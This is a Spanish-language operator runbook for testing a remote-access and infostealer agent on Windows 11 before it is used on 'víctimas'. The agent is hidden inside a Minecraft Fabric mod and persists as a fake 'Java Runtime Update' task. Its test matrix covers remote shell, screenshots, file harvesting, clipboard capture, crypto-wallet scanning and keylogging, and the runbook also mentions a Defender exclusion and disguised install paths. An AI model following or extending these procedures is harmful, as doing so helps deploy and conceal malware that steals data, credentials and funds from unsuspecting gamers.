# Runbook: canario en Windows 11

Objetivo: validar 0.4.0 en un Windows real antes de tocar víctimas. No es una
guía para el usuario final; es para el operador que monta el equipo.

## 0. Prerrequisitos

- Windows 11 **23H2** y **24H2**. Si es un equipo físico en dualboot, vale el
  mismo equipo para una versión; la otra exige actualizar/reinstalar o una
  segunda máquina.
- Cuenta local con administrador para las pruebas de persistencia/UAC.
- Java 21 (Temurin) para ejecutar el agente y `jarsigner`.
- Minecraft 1.20.1 + Fabric Loader 0.20.1, instancia limpia, lanzada y cerrada
  una vez para generar el perfil.
- Acceso al panel y a una build de canario. Un equipo por versión de Windows.
- `tools/windows-gate.ps1` y el repositorio clonado si vas a repetir el gate.

**Antes de instalar:** snapshot si es VM; en dualboot, imagen/restore point y
hora sincronizada. Defender con su estado habitual (no lo desactives salvo en
una pasada separada).

### 0.1 Particularidades de dualboot (equipo físico)

El agente no toca la partición Linux, pero sí el perfil de Windows. Para que la
prueba sea reversible:

1. Crea un punto de restauración y una imagen o copia de tus datos. Un restore
   point no sustituye la copia de documentos.

   ```powershell
   Checkpoint-Computer -Description "spc-canary" -RestorePointType MODIFY_SETTINGS
   ```

2. Apunta la clave de recuperación de BitLocker si está activo.
3. Desactiva Inicio rápido e hibernación para no dejar NTFS sucio al volver a
   Linux:

   ```powershell
   powercfg /h off
   ```

4. Crea un usuario local **dedicado** `spc-canary` (administrador) y una
   instancia/carpeta de Minecraft también dedicada. Así el agente, la tarea de
   logon y el JAR no se mezclan con tu perfil real.
5. Si Linux y Windows comparten reloj, activa UTC en Windows y resincroniza;
   sin esto, Windows deja el RTC en hora local y Linux arranca desfasado:

   ```powershell
   reg add "HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation" /v RealTimeIsUniversal /t REG_DWORD /d 1 /f
   w32tm /resync
   ```

6. Para el escenario de “otro volumen” no uses `subst` (no es un volumen
   distinto): crea un VHDX con `diskpart`, como en el runner. En un equipo sin
   AD, el escenario de perfil redirigido se aproxima con un segundo usuario
   local y una junction, o se marca como no aplicable.
7. Tras la retirada, comprueba que Linux sigue arrancando y que el reloj no
   queda desfasado.

## 1. Verificar el artefacto

`agent.jar` sale del **release** (asset `agent-<version>.jar`), no del panel: el
panel solo entrega el mod `fabric-sync-<version>.jar`, que lleva el agente
embebido. Renombra el asset a `agent.jar` o ajusta los comandos. Verifica ambos
en el equipo de build:

```powershell
jarsigner -verify -verbose .\agent.jar | Select-String 'jar verified','timestamp'
# Solo en la máquina que compiló: el PE en claro vive en agent/build/chrome/
Get-AuthenticodeSignature .\agent\build\chrome\chromelevator_x64.exe | Select-Object Status,SignerCertificate
```

Debe aparecer `jar verified`, un timestamp y `Status = Valid`. Sin eso, no es un
release de canario: es una prueba de código.

Comprueba también la integridad cruda contra el `SHA256.txt` del release:

```powershell
Get-FileHash .\agent.jar -Algorithm SHA256
Get-FileHash .\fabric-sync-<version>.jar -Algorithm SHA256
Get-Content .\SHA256.txt
```

El hash canónico que usa el stager para decidir si reinstala **no** es el
SHA-256 crudo del zip: está en `serverpackcore/agent.sha256` dentro del mod y
debe coincidir con `agent/build/libs/agent.sha256` del build. El `SHA256.txt`
solo prueba que la descarga no se corrompió.

## 2. Preparar el panel

1. Crea un build `canary-<hostname>` con perfil `lite`, gracia 24 h, sin
   capabilities v2.
2. Compila y descarga el JAR.
3. Anota `build_id`, token y hash del JAR.
4. Comprueba `/api/console/health`: `degraded=false`.
5. Ten abierta la vista de la víctima y `events`; el canario se vigila, no se
   deja solo.

## 3. Instalar en el equipo de prueba

Hazlo desde la sesión `spc-canary`. El agente vive en su `%LOCALAPPDATA%` y su
tarea de logon; no lo mezcles con tu perfil diario.

1. Cierra Minecraft.
2. Copia el JAR a `%APPDATA%\.minecraft\mods\` (o `minecraft\mods` de la
   instancia Prism).
3. Arranca Minecraft, entra a un mundo y espera 30–90 s.
4. Cierra Minecraft.

Comprobaciones:

```powershell
Get-ScheduledTask -TaskName 'Java Runtime Update' | Select-Object State
Get-CimInstance Win32_Process | Where-Object CommandLine -match 'runtime\.jar'
Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Java" -Force
```

Esperado: tarea `Ready`, un `javaw.exe` con `runtime.jar` **después de cerrar
Minecraft**, y el árbol con `runtime.jar`, `startup.vbs`, `javaw.exe` y
`crypto-config.json`.

En el panel: evento `enrolled`, heartbeat en < 60 s y campo **Identidad** de la
pestaña Resumen mostrando `confirmed` tras la primera petición firmada. Si aparece
`unverified_enroll` y no se confirma, el agente no está volviendo a firmar:
revisa `logs/agent.log`.

## 4. Matriz funcional mínima

Desde el panel, una por una, esperando resultado:

| Prueba | Esperado |
|---|---|
| `recon` | host, usuario, SO, CPU/RAM |
| `shell` `whoami` | salida en < 10 s |
| `screenshot` | PNG visible |
| `harvest` pequeño o `file_pull` de un fichero de 1 MB | artefacto `ready` |
| `clip_start`, copiar texto, `clip_stop` | fila de portapapeles |
| `scan_wallets` con una extensión instalada | artefacto y estado de wallet |
| comando de agente `status` | `crypto` activo, outbox a 0 |

No sigas si falla el heartbeat, el outbox o el commit de artefactos.

## 5. Resiliencia

1. **Panel caído 10 min:** para el panel, lanza un `shell` que genere salida,
   espera, revive el panel. La tarea debe cerrarse una sola vez y el outbox
   bajar a 0.
2. **Re-enrolamiento:** `agent reconnect`; el salt debe conservarse
   (`key_epoch` igual) y no debe aparecer `bad_device_token` en bucle.
3. **Rotación de clave:** desde el panel, rotar clave; el agente debe recibir
   el epoch nuevo en el siguiente heartbeat y drenar la cola vieja.
4. **Panic:** `POST /panic?dry_run=1` (recuento, sin mutar), luego panic real,
   comprobar 410 y `outbox/held`; `panic/restore` y esperar el re-enrolamiento
   automático (≤ 30 s). Debe seguir revocada hasta re-enrolar.
5. **Reinicio del equipo:** el agente debe volver por la tarea de logon; sin
   sesión interactiva no habrá hook de teclado ni portapapeles.

## 6. Escenarios Windows del gate C

Si el CI aún no está verde, hazlos a mano y adjunta evidencia:

1. **Otro volumen:** crea un VHD, asígnalo y mueve `cache` con una junction
   (`mklink /J`). Repite un `shell` y un `harvest`; no debe haber
   `AtomicMoveNotSupportedException`.
2. **CLM:** `powershell -NoProfile -Command "$ExecutionContext.SessionState.LanguageMode='ConstrainedLanguage'; ..."`.
   Ejecuta `recon` y `av`; deben degradar con `cim_unavailable`, sin morir.
3. **Uninstall con ficheros abiertos:** abre `runtime.jar` con
   `[IO.File]::Open(...)`, ejecuta `agent uninstall --keep-data`; a los 3 s debe
   borrar lo permitido y conservar `cache`.
4. **`hs_err`:** copia un `hs_err_pid9999.log` al árbol, relanza y comprueba el
   evento `crash_report` y la copia filtrada en `cache\crash`.
5. **Manifiesto/services:** altera un byte de `META-INF/MANIFEST.MF` dentro de
   `agent.bin`, actualiza el hash si procede, y comprueba que el stager rechaza
   el JAR manipulado.
6. **`.version`:** cambia la versión o el hash; el stager debe reinstalar.
7. **Perfil redirigido:** con AD, repite la instalación con la carpeta de
   usuario en otra unidad. Sin AD (dualboot doméstico), usa un segundo usuario
   local con el perfil en el VHDX o una junction y anótalo como aproximación.

Registra salida, hora y versión de Windows en cada escenario.

## 7. Monitorización

```powershell
Get-Content "$env:LOCALAPPDATA\Microsoft\Java\logs\agent.log" -Tail 80
Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Java\cache\outbox" -Force
Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Java\cache\outbox\dead" -Force
Get-ScheduledTask -TaskName 'Java Runtime Update'
```

En el panel: `unverified_enroll`, `bad_device_token`, `outbox_dropped`,
`key_epoch_unknown`, `artifact_failed`.

## 8. Retirada del canario

```powershell
# conservar cache/logs para forense
& "$env:LOCALAPPDATA\Microsoft\Java\javaw.exe" -jar "$env:LOCALAPPDATA\Microsoft\Java\runtime.jar" uninstall --keep-data
```

Luego borra el JAR de `mods`, el árbol del agente si quedó, su exclusión de
Defender y restaura el snapshot o el punto de restauración:

```powershell
Remove-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Microsoft\Java\cache\tools" -ErrorAction SilentlyContinue
Remove-Item "$env:LOCALAPPDATA\Microsoft\Java" -Recurse -Force -ErrorAction SilentlyContinue
```

En dualboot, reinicia y confirma que Linux arranca y que la hora sigue bien.
Decide: promover, corregir o abortar.

## 9. Go / No-Go

**Go** solo si: firma válida, heartbeat estable, artefacto íntegro, outbox a 0,
re-enrolamiento conserva salt, panic/restore se comporta y no hay crash del
agente en 60 min de uso normal.

**No-Go** ante: `jar_missing`, `artifact_key_mismatch`, `key_epoch_unknown`
repetido, outbox creciendo, tarea duplicada, agente que no sobrevive al cierre
del juego, dos instancias vivas, o —en dualboot— Linux que deja de arrancar o
reloj desfasado tras la retirada.
